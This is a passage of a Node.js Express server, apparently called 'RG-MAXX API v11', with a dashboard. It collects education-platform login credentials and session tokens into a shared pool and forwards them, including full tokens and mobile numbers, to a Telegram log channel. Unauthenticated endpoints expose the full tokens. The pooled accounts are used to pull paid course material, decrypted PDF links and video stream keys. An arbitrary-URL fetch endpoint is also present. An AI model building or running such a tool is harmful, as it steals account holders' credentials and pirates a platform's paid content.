      return`<div class="user-card"><div class="user-top"><div class="user-avatar">${av}</div><div><div class="user-name">${u.name||'User '+u.userId}</div><div class="user-id">${u.userId}</div></div><span class="src-badge ${cls}">${u.source||'api'}</span></div><div class="token-row"><div class="token-text">${u.tokenPreview}</div><button class="copy-btn" onclick="copyFull('${encodeURIComponent(u.tokenFull||u.tokenPreview)}',this)">Copy</button></div><div class="user-meta"><div class="meta-pill">📚 <strong>${u.batchCount}</strong> batches</div><div class="meta-pill">📅 <strong>${addedDate}</strong></div></div><div class="health-bar"><div class="health-fill" style="width:100%"></div></div></div>`;
    }).join('')+'</div>';
  }catch(e){el.innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading users.</div></div>';}
}
function copyFull(encoded,btn){
  const token=decodeURIComponent(encoded);
  navigator.clipboard.writeText(token).then(()=>{btn.textContent='✓ Copied';btn.classList.add('copied');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);}).catch(()=>{const ta=document.createElement('textarea');ta.value=token;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);});
}
async function loadTelegram(){
  try{
    const data=await fetch('/api/telegram-stats').then(r=>r.json());
    document.getElementById('tg-total').textContent=data.telegram_count||0;
    document.getElementById('tg-users').textContent=data.telegram_count||0;
    const tgBatches=(data.tokens||[]).reduce((s,t)=>s+t.batchCount,0);
    document.getElementById('tg-batches').textContent=tgBatches||0;
    document.getElementById('tg-today').textContent=data.today_logins||0;
    const tcEl=document.getElementById('tg-tokens-container');
    if(!data.tokens||data.tokens.length===0){tcEl.innerHTML='<div class="empty"><div class="empty-icon">🤖</div><div>No Telegram tokens.</div></div>';}
    else{tcEl.innerHTML='<div class="user-list">'+data.tokens.map(t=>`<div class="user-card"><div class="user-top"><div class="user-avatar" style="background:linear-gradient(135deg,#00e5ff,#4f8ef7)">${(t.userId||'?')[0].toUpperCase()}</div><div><div class="user-name">${t.name||'User '+t.userId}</div><div class="user-id">${t.userId}</div></div><span class="src-badge src-telegram">TG</span></div><div class="token-row"><div class="token-text">${t.tokenPreview}</div><button class="copy-btn" onclick="copyFull('${encodeURIComponent(t.tokenFull||t.tokenPreview)}',this)">Copy</button></div><div class="user-meta"><div class="meta-pill">📚 <strong>${t.batchCount}</strong> batches</div></div></div>`).join('')+'</div>';}
    const logsEl=document.getElementById('tg-logs-container');
    if(!data.logs||data.logs.length===0){logsEl.innerHTML='<div class="empty"><div class="empty-icon">📋</div><div>No logs yet.</div></div>';}
    else{const srcCls={telegram:'src-telegram',id_pass:'src-api',manual:'src-manual',website:'src-login'};const srcLabel={telegram:'TG Bot',id_pass:'ID+Pass',manual:'Manual',website:'Website'};logsEl.innerHTML='<div class="log-feed">'+[...data.logs].reverse().map(l=>{const t=new Date(l.timestamp);const timeStr=t.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'})+' '+t.toLocaleDateString('en-IN',{day:'2-digit',month:'short'});const cls=srcCls[l.source]||'src-login';return`<div class="log-entry source-${l.source}"><div class="log-top"><span class="log-uid">${l.userId}</span><span class="src-badge ${cls}" style="font-size:.55rem">${srcLabel[l.source]||l.source}</span><span class="log-time">${timeStr}</span></div><div class="log-token">${l.tokenPreview}</div><div class="log-batches">📚 ${l.batchCount} batches</div></div>`;}).join('')+'</div>';}
  }catch(e){document.getElementById('tg-tokens-container').innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error.</div></div>';}
}
async function loadHealth(){
  const el=document.getElementById('health-container');
  el.innerHTML='<div class="loader"><div class="spin"></div>Loading health...</div>';
  try{
    const data=await fetch('/api/health').then(r=>r.json());
    if(!data.health||data.health.length===0){el.innerHTML='<div class="empty"><div class="empty-icon">💓</div><div>No tokens in pool.</div></div>';return;}
    el.innerHTML='<div class="health-grid">'+data.health.map(h=>{const clr=h.failures===0?'var(--green)':h.failures<3?'var(--yellow)':'var(--red)';const w=Math.max(0,100-h.failures*34);const icon=h.failures===0?'🟢':h.failures<3?'🟡':'🔴';return`<div class="health-card"><div class="health-top"><div class="health-status-icon" style="background:${clr}22">${icon}</div><div style="flex:1"><div style="font-size:.85rem;font-weight:700;color:var(--text)">${h.name||'User '+h.userId}</div><div style="font-size:.68rem;color:var(--muted)">${h.userId}</div></div><span class="src-badge" style="color:${clr};border-color:${clr}33;background:${clr}11">${h.status}</span></div><div class="health-meta"><span>❌ Failures: <strong style="color:${clr}">${h.failures}/3</strong></span><span>Source: ${h.source}</span></div><div class="health-bar"><div class="health-fill" style="width:${w}%;background:${clr}"></div></div></div>`;}).join('')+'</div>';
  }catch(e){el.innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error.</div></div>';}
}
async function tryApiResp(btn,url,method,body){
  const respEl=btn.nextElementSibling;
  respEl.classList.add('visible');
  respEl.textContent='Loading...';
  try{
    const opts={method,headers:{'Content-Type':'application/json'}};
    if(body&&method==='POST') opts.body=JSON.stringify(body);
    const r=await fetch(url,opts);
    const json=await r.json();
    respEl.textContent=JSON.stringify(json,null,2);
  }catch(e){respEl.textContent='Error: '+e.message;}
}
initStats();
loadBatches();
setInterval(initStats,30000);
</script>
</body>
</html>`);
});

// ══════════════════════════════════════════════════════════════════════════════
// API ROUTES
// ══════════════════════════════════════════════════════════════════════════════

app.get("/api/status", (req, res) => {
  res.json({
    status: "RG-MAXX API v11 Online",
    version: "v11",
    tokens: getTokenCount(),
    manual_users_defined: MANUAL_USERS.filter(u => u.token && !u.token.startsWith("TOKEN_")).length,
    telegram_bot: !!process.env.TELEGRAM_BOT_TOKEN,
    telegram_channel: !!process.env.TELEGRAM_LOG_CHANNEL_ID,
    keepalive: "active",
    features: ["native-fetch", "no-node-fetch", "vercel-safe", "lazy-init", "full-token-logs"],
  });
});

app.get("/api/telegram-stats", (req, res) => {
  const tgTokens = getTelegramTokens();
  const logs = getLogHistory();
  res.json({
    telegram_count: tgTokens.length,
    today_logins: getTodayLoginCount(),
    tokens: tgTokens.map(t => ({
      userId: t.userId, name: t.name || "",
      batchCount: t.batches.length,
      tokenPreview: t.token.substring(0, 40) + "...",
      tokenFull: t.token,
      addedAt: t.addedAt, source: t.source,
    })),
    logs,
  });
});

app.get("/api/health", (req, res) => {
  const health = getTokenHealth();
  res.json({
    total: health.length,
    healthy: health.filter(h => h.failures === 0).length,
    warning: health.filter(h => h.failures > 0 && h.failures < 3).length,
    dead: health.filter(h => h.failures >= 3).length,
    health,
  });
});

app.get("/api/users", (req, res) => {
  const users = getAllTokens().map(t => ({
    userId: t.userId, name: t.name || "", source: t.source || "unknown",
    batchCount: t.batches.length,
    batches: t.batches.map(b => ({ id: b.id, name: b.name, expiry: b.expiry || "" })),
    addedAt: t.addedAt, updatedAt: t.updatedAt,
    tokenPreview: t.token.substring(0, 40) + "...",
    tokenFull: t.token,
  }));
  res.json({ total: users.length, manual: users.filter(u => u.source === "manual").length, dynamic: users.filter(u => u.source !== "manual").length, users });
});

app.get("/api/reload-users", async (req, res) => {
  const { secret } = req.query;
  if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: "Forbidden" });
  }
  initialized = false; // force re-init
  await ensureInit();
  res.json({ success: true, totalInPool: getTokenCount() });
});

app.post("/api/login", async (req, res) => {
  try {
    const { userId, token, mobile, password } = req.body || {};
    let finalUserId, finalToken;
    if (mobile && password) {
      try {
        const result = await loginWithCredentials(mobile, password);
        finalUserId = result.userId; finalToken = result.token;
      } catch (e) { return res.status(401).json({ success: false, error: `Login failed: ${e.message}` }); }
    } else if (userId && token) {
      finalUserId = String(userId); finalToken = String(token);
    } else {
      return res.status(400).json({ success: false, error: "Send { mobile, password } OR { userId, token }" });
    }
    const batches = await fetchUserBatches(finalUserId, finalToken);
    addToken(finalUserId, finalToken, "", batches, "login");
    const source = (mobile && password) ? "id_pass" : "website";
    const extra = (mobile && password) ? mobile : "";
    await sendLog(buildLoginLog(finalUserId, finalToken, batches, source, extra));
    res.json({ success: true, userId: finalUserId, batchCount: batches.length, batches, message: "Token added. Auto batches fetched." });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get("/api/add-token", async (req, res) => {
  try {
    const { userid, token, name } = req.query;
    if (!userid || !token) return res.status(400).json({ error: "userid and token required" });
    const batches = await fetchUserBatches(userid, token);
    addToken(userid, token, name || "", batches, "api");
    await sendLog(buildLoginLog(userid, token, batches, "website"));
    res.json({ success: true, userId: userid, batchCount: batches.length, batches });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post("/api/bulk-login", async (req, res) => {
  try {
    const users = Array.isArray(req.body) ? req.body : [];
    if (users.length === 0) return res.status(400).json({ error: "Send array: [{userId, token}, ...]" });
    const results = await Promise.allSettled(
      users.filter(u => u.userId && u.token).map(async u => {
        const batches = await fetchUserBatches(u.userId, u.token);
        addToken(u.userId, u.token, u.name || "", batches, "bulk");
        return { userId: u.userId, batchCount: batches.length };
      })
    );
    const added = results.filter(r => r.status === "fulfilled").length;
    res.json({ success: true, added, total: getTokenCount() });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get("/api/remove-token", (req, res) => {
  const { userid } = req.query;
  if (!userid) return res.status(400).json({ error: "userid required" });
  res.json({ success: removeToken(userid), userId: userid });
});

app.get("/api/pool", (req, res) => {
  const users = getAllTokens().map(t => ({
    userId: t.userId, name: t.name || "", source: t.source,
    batchCount: t.batches.length,
    batchNames: t.batches.map(b => `[${b.id}] ${b.name}`),
    addedAt: t.addedAt, tokenPreview: t.token.substring(0, 30) + "...",
  }));
  res.json({ total: users.length, users });
});

app.get("/api/clear-pool", (req, res) => {
  const { secret } = req.query;
  if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: "Forbidden" });
  }
  res.json({ success: true, cleared: clearPool() });
});

app.get("/api/all-batches", async (req, res) => {
  try {
    const tokens = getAllTokens();
    if (tokens.length === 0) return res.json({ status: 200, total: 0, data: [], message: "No tokens in pool" });
    const batchMap = new Map();
    await Promise.allSettled(tokens.map(async entry => {
      try {
        const headers = makeHeaders(entry.token, entry.userId);
        const resp = await fetch(`${BASE_URL}/get/get_all_purchases?userid=${entry.userId}`, { headers, signal: AbortSignal.timeout(12000) });
        if (!resp.ok) return;
        const data = await resp.json();
        for (const item of data.data || []) {
          if (item.itemtype === "Course" && item.coursedt?.[0]) {
            const c = item.coursedt[0];
            const id = String(c.id);
            if (!batchMap.has(id)) batchMap.set(id, { id, name: c.course_name, thumbnail: c.course_thumbnail || "", expiry: item.enddatetime || "" });
          }
        }
      } catch (_) {}
    }));
    const masterList = Array.from(batchMap.values());
    res.json({ status: 200, total: masterList.length, data: masterList });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get("/api/my-courses", async (req, res) => {
  try {
    const { userid } = req.query;
    const entry = userid ? getToken(userid) : getAnyToken();
    if (!entry) return res.status(503).json({ error: "No token found" });
    const headers = makeHeaders(entry.token, entry.userId);
    const resp = await fetch(`${BASE_URL}/get/mycourseweb?userid=${entry.userId}`, { headers, signal: AbortSignal.timeout(12000) });
    const data = await resp.json();
    const courses = (data.data || []).map(c => ({ id: c.id, name: c.course_name, thumbnail: c.course_thumbnail, expiry: c.expiryDate, is_paid: c.is_paid }));
    res.json({ total: courses.length, courses });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get("/api/subjects", async (req, res) => {
  try {
    const { courseid } = req.query;
    if (!courseid) return res.status(400).json({ error: "courseid required" });
    const r = await smartFetch("/get/allsubjectfrmlivecourseclass", { courseid, start: "-1" }, false, courseid);
    if (r.status !== 200) return res.status(r.status).json({ error: r.error });
    res.json({ total: (r.data||[]).length, subjects: (r.data||[]).map(s=>({id:s.subjectid,name:s.subject_name})) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/topics", async (req, res) => {
  try {
    const { courseid, subjectid } = req.query;
    if (!courseid||!subjectid) return res.status(400).json({ error: "courseid and subjectid required" });
    const r = await smartFetch("/get/alltopicfrmlivecourseclass", { courseid, subjectid, start: "-1" }, false, courseid);
    if (r.status !== 200) return res.status(r.status).json({ error: r.error });
    res.json({ total: (r.data||[]).length, topics: (r.data||[]).map(t=>({id:t.topicid,name:t.topic_name})) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/concepts", async (req, res) => {
  try {
    const { courseid, subjectid, topicid } = req.query;
    if (!courseid||!subjectid||!topicid) return res.status(400).json({ error: "courseid, subjectid, topicid required" });
    const r = await smartFetch("/get/allconceptfrmlivecourseclass", { courseid, subjectid, topicid, start: "-1" }, false, courseid);
    if (r.status !== 200) return res.status(r.status).json({ error: r.error });
    res.json({ total: (r.data||[]).length, concepts: (r.data||[]).map(c=>({id:c.conceptid,name:c.concept_name})) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/videos", async (req, res) => {
  try {
    const { courseid, subjectid, topicid, conceptid } = req.query;
    if (!courseid||!subjectid||!topicid) return res.status(400).json({ error: "courseid, subjectid, topicid required" });
    const r = await smartFetch("/get/livecourseclassbycoursesubtopconceptapiv3",
      { courseid, subjectid, topicid, conceptid: conceptid||"1", start: "0" }, false, courseid);
    if (r.status !== 200) return res.status(r.status).json({ error: r.error });
    res.json({ total: (r.data||[]).length, content: (r.data||[]).map(i=>({
      id:i.id, title:i.Title, type:i.material_type,
      pdf_url:decrypt(i.pdf_link),
      player_url:i.video_player_url ? i.video_player_url+i.video_player_token : null,
      video_id:i.video_id||null, duration:i.video_duration||null,
    }))});
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/video-details", async (req, res) => {
  try {
    const { course_id, video_id } = req.query;
    if (!video_id) return res.status(400).json({ error: "video_id required" });
    const r = await smartFetch("/get/fetchVideoDetailsById",
      { course_id:course_id||"257", video_id, ytflag:"0", folder_wise_course:"0", lc_app_api_url:"" }, true, course_id);
    if (r.status !== 200) return res.status(r.status).json({ error: r.error });
    const d = r.data||{};
    res.json({
      video_id, title:d.title||"", duration:d.video_duration||"",
      streams:(d.encrypted_links||[]).map(q=>({quality:q.quality,url:decrypt(q.path),key:decrypt(q.key)})),
      player_url:d.video_player_url ? d.video_player_url+(d.video_player_token||"") : null,
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/tests", async (req, res) => {
  try {
    const { testseriesid, subject_id } = req.query;
    if (!testseriesid) return res.status(400).json({ error: "testseriesid required" });
    const entry = getAnyToken();
    if (!entry) return res.status(503).json({ error: "No tokens in pool" });
    const headers = makeHeaders(entry.token, entry.userId);
    const j = await fetch(`${BASE_URL}/get/test_titlev2?testseriesid=${testseriesid}&subject_id=${subject_id||""}&userid=${entry.userId}&start=-1`, {headers, signal: AbortSignal.timeout(12000)}).then(r=>r.json());
    res.json({ total:(j.test_titles||[]).length, tests:(j.test_titles||[]).map(t=>({id:t.id,title:t.title,questions_url:t.test_questions_url})) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/questions", async (req, res) => {
  try {
    const { url } = req.query;
    if (!url) return res.status(400).json({ error: "url required" });
    res.json(await fetch(url, { signal: AbortSignal.timeout(12000) }).then(r=>r.json()));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/telegram-webhook", async (req, res) => {
  try {
    res.sendStatus(200);
    await processTelegramUpdate(req.body);
  } catch (err) { console.error("[Webhook]", err.message); }
});

app.get("/api/set-webhook", async (req, res) => {
  try {
    const host = req.headers.host;
    const protocol = host.includes("localhost") ? "http" : "https";
    const webhookUrl = `${protocol}://${host}/api/telegram-webhook`;
    const result = await setWebhook(webhookUrl);
    res.json({ webhookUrl, telegramResponse: result });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.use((req, res) => {
  res.status(404).json({ error: "Not found. Visit / for dashboard." });
});

// ══════════════════════════════════════════════════════════════════════════════
// ✅ VERCEL FIX: export default ONLY — no app.listen() on Vercel
// Local pe PORT se chalega
// ══════════════════════════════════════════════════════════════════════════════
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`✅ RG-MAXX API v11 on port ${PORT}`);
    console.log(`📖 Dashboard: http://localhost:${PORT}/`);
    console.log(`🤖 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? "configured ✅" : "NOT configured ❌"}`);
    console.log(`✨ v11: native fetch | no node-fetch | Vercel-safe lazy init`);
  });
  // Local pe bhi keepalive
  ensureInit().then(() => startKeepAlive());
}

export default app;
